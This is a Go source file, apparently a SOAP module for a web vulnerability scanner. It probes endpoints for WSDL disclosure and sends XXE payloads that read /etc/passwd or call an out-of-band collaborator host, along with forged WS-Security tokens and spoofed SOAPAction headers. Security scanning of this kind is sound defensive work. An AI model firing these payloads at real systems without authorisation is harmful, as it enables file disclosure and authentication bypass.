package soap

import (
	"context"
	"fmt"
	"strings"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/pkg/models"
)

type SOAPModule struct {
	cfg    *engine.Config
	client *fanghttp.Client
}

func (m *SOAPModule) ID() string   { return "soap" }
func (m *SOAPModule) Name() string { return "SOAP Web Service Scanner" }
func (m *SOAPModule) Description() string {
	return "Detects exposed SOAP endpoints, WSDL disclosure, XXE injection, WS-Security bypass, and SOAPAction spoofing"
}
func (m *SOAPModule) Severity() models.Severity { return models.Critical }

func (m *SOAPModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout))
	return nil
}

func (m *SOAPModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	var findings []*models.Finding

	baseURL := strings.TrimRight(target.URL, "/")

	endpoints := []string{
		"/soap", "/ws", "/wsdl", "/service.asmx", "/service.svc",
		"/endpoint.jsp", "/services", "/api/soap", "/soap.php",
		"/soap.aspx", "/service", "/Service.asmx", "/Service.svc",
	}

	for _, ep := range endpoints {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		testURL := baseURL + ep
		resp, err := m.client.Get(testURL)
		if err != nil {
			continue
		}

		if resp.StatusCode != 200 && resp.StatusCode != 500 {
			continue
		}

		bodyLower := strings.ToLower(resp.Body)
		soapIndicators := []string{
			"wsdl", "definitions", "soap:envelope", "soap:body",
			"xmlns:soap", "schema", "targetnamespace", "soap:binding",
			"<message ", "<porttype ", "<service ", "<binding ",
			"web service", "soap action",
		}

		isSOAP := false
		for _, ind := range soapIndicators {
			if strings.Contains(bodyLower, ind) {
				isSOAP = true
				break
			}
		}

		if !isSOAP && resp.StatusCode == 200 {
			continue
		}

		if resp.StatusCode == 200 && isSOAP {
			findings = append(findings, &models.Finding{
				Title:       "SOAP - Endpoint Discovered",
				Severity:    models.High,
				Confidence:  models.HighConfidence,
				URL:         testURL,
				Evidence:    fmt.Sprintf("SOAP endpoint at %s returned HTTP 200 with SOAP/XML content", ep),
				Description: "A SOAP web service endpoint is publicly accessible without authentication.",
				Remediation: "Restrict SOAP endpoint access to authorized clients only. Use WS-Security or mutual TLS.",
				CWEID:       "CWE-200",
				ModuleID:    "soap",
			})
		}

		_ = ep
	}

	wsdlParams := []string{"?wsdl", "?singleWsdl", "?WSDL", "?wsdl=1"}
	for _, ep := range endpoints {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		for _, qp := range wsdlParams {
			testURL := baseURL + ep + qp
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			bodyLower := strings.ToLower(resp.Body)
			if strings.Contains(bodyLower, "definitions") && strings.Contains(bodyLower, "targetnamespace") {
				findings = append(findings, &models.Finding{
					Title:       "SOAP - WSDL Disclosure",
					Severity:    models.High,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Evidence:    fmt.Sprintf("WSDL accessible via %s%s", ep, qp),
					Description: "WSDL document is publicly accessible, revealing all service operations, data types, and binding details.",
					Remediation: "Disable WSDL publication in production. Remove ?wsdl parameter support or require authentication.",
					CWEID:       "CWE-200",
					ModuleID:    "soap",
				})
				break
			}
		}
	}

	xxePayloads := []struct {
		name    string
		payload string
		check   string
	}{
		{
			name: "Classic XXE - /etc/passwd",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><foo>&xxe;</foo></soap:Body>
</soap:Envelope>`,
			check: "root:",
		},
		{
			name: "Blind XXE OOB",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collaborator.fang/oob"> %xxe;]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><foo>test</foo></soap:Body>
</soap:Envelope>`,
			check: "",
		},
		{
			name: "Parameter Entity XXE",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"> %file;]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><foo>test</foo></soap:Body>
</soap:Envelope>`,
			check: "",
		},
	}

	for _, xp := range xxePayloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		for _, ep := range endpoints {
			testURL := baseURL + ep
			resp, err := m.client.DoRaw("POST", testURL, map[string]string{
				"Content-Type": "text/xml; charset=utf-8",
				"SOAPAction":   "\"\"",
			}, xp.payload)
			if err != nil {
				continue
			}

			if xp.check != "" && strings.Contains(resp.Body, xp.check) {
				findings = append(findings, &models.Finding{
					Title:       fmt.Sprintf("SOAP - XXE Injection (%s)", xp.name),
					Severity:    models.Critical,
					Confidence:  models.CriticalConfidence,
					URL:         testURL,
					Payload:     truncate(xp.payload, 120),
					Evidence:    fmt.Sprintf("Response contains '%s' - file read confirmed", xp.check),
					Description: "SOAP endpoint is vulnerable to XML External Entity (XXE) injection, allowing file reads and SSRF.",
					Remediation: "Disable DOCTYPE parsing and external entity resolution in the SOAP XML parser.",
					CWEID:       "CWE-611",
					ModuleID:    "soap",
				})
				goto wsSecurity
			}

			if resp.StatusCode != 400 && resp.StatusCode != 500 {
				bodyLower := strings.ToLower(resp.Body)
				if strings.Contains(bodyLower, "xml") || strings.Contains(bodyLower, "entity") || strings.Contains(bodyLower, "doctype") {
					findings = append(findings, &models.Finding{
						Title:       fmt.Sprintf("SOAP - XXE Possible (%s)", xp.name),
						Severity:    models.High,
						Confidence:  models.MediumConfidence,
						URL:         testURL,
						Payload:     truncate(xp.payload, 120),
						Evidence:    "SOAP endpoint accepted XML with external entity references",
						Description: "SOAP endpoint may be processing external entity references. Confirm with OOB techniques.",
						Remediation: "Disable DOCTYPE parsing and external entity resolution in the SOAP XML parser.",
						CWEID:       "CWE-611",
						ModuleID:    "soap",
					})
					goto wsSecurity
				}
			}
		}
	}

wsSecurity:
	wsBypassPayloads := []string{
		`<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Header><wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" soap:mustUnderstand="0"><wsse:UsernameToken><wsse:Username>admin</wsse:Username><wsse:Password>anything</wsse:Password></wsse:UsernameToken></wsse:Security></soap:Header><soap:Body><foo>test</foo></soap:Body></soap:Envelope>`,
		`<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Header><wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" soap:mustUnderstand="0"><wsse:BinarySecurityToken ValueType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3" EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">ZmFrZQ==</wsse:BinarySecurityToken></wsse:Security></soap:Header><soap:Body><foo>test</foo></soap:Body></soap:Envelope>`,
	}

	for i, payload := range wsBypassPayloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		for _, ep := range endpoints {
			testURL := baseURL + ep
			resp, err := m.client.DoRaw("POST", testURL, map[string]string{
				"Content-Type": "text/xml; charset=utf-8",
				"SOAPAction":   "\"\"",
			}, payload)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 || resp.StatusCode == 202 {
				bodyLower := strings.ToLower(resp.Body)
				if !strings.Contains(bodyLower, "authentication failed") && !strings.Contains(bodyLower, "unauthorized") && !strings.Contains(bodyLower, "access denied") {
					title := "SOAP - WS-Security Bypass (UsernameToken)"
					if i == 1 {
						title = "SOAP - WS-Security Bypass (BinarySecurityToken)"
					}
					findings = append(findings, &models.Finding{
						Title:       title,
						Severity:    models.Critical,
						Confidence:  models.MediumConfidence,
						URL:         testURL,
						Payload:     truncate(payload, 120),
						Evidence:    fmt.Sprintf("Fabricated security token accepted on SOAP endpoint %s (HTTP %d)", ep, resp.StatusCode),
						Description: "SOAP endpoint accepted a request with a fabricated WS-Security token. WS-Security may be improperly validated.",
						Remediation: "Implement proper WS-Security validation including signature verification, timestamp freshness, and token validation.",
						CWEID:       "CWE-287",
						ModuleID:    "soap",
					})
					goto soapAction
				}
			}
		}
	}

soapAction:
	actionPayloads := []string{
		"\"http://tempuri.org/AdminOperation\"",
		"\"*\"",
		"\"AnythingHere\"",
		"\"http://target/AdminService/Authenticate\"",
	}
	for _, action := range actionPayloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		for _, ep := range endpoints {
			testURL := baseURL + ep
			body := `<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><AnyOperation xmlns="http://tempuri.org/"><param>test</param></AnyOperation></soap:Body></soap:Envelope>`

			resp, err := m.client.DoRaw("POST", testURL, map[string]string{
				"Content-Type": "text/xml; charset=utf-8",
				"SOAPAction":   action,
			}, body)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 || resp.StatusCode == 202 {
				findings = append(findings, &models.Finding{
					Title:       "SOAP - SOAPAction Header Spoofing",
					Severity:    models.High,
					Confidence:  models.MediumConfidence,
					URL:         testURL,
					Payload:     action,
					Evidence:    fmt.Sprintf("Custom SOAPAction '%s' accepted on %s (HTTP %d)", action, ep, resp.StatusCode),
					Description: "SOAP endpoint accepts arbitrary SOAPAction headers, potentially allowing unauthorized operation invocation.",
					Remediation: "Validate SOAPAction header against a whitelist of allowed operations. Implement proper operation-level authorization.",
					CWEID:       "CWE-287",
					ModuleID:    "soap",
				})
				goto done
			}
		}
	}

done:
	return findings, nil
}

func truncate(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

func init() {
	engine.GetRegistry().Register(&SOAPModule{})
}
